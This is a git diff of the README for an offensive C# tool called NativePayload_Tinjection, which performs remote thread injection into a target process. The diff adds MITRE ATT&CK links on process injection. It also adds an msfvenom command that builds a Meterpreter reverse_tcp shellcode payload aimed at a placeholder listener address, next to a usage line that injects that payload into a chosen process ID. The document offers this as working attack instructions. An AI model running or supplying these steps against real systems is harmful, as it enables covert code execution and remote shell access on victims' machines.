@@ -1,7 +1,18 @@
 # NativePayload_Tinjection
-Remote Thread Injection by C#
+Creating Remote Thread into Target Process , (Remote Thread Injection by C#)
 
+-----------------------
+Related Links for "Mitre ATT&CK" : 
+
+Process Injection: Portable Executable Injection ==>  https://attack.mitre.org/techniques/T1055/002/
+
+Process Injection: Dynamic-link Library Injection ==> https://attack.mitre.org/techniques/T1055/001/
+
+--------------------------
 Your Payload Should be Msfvenom Payload ... 
+
+Msfvenom –platform windows –arch x86_64 -p windows/x64/meterpreter/reverse_tcp lhost=w.x.y.z -f c > payload.txt
+-------------------------
 
     Code1: NativePayload_Tinjection.exe [TPID] [PAYLOAD]
 
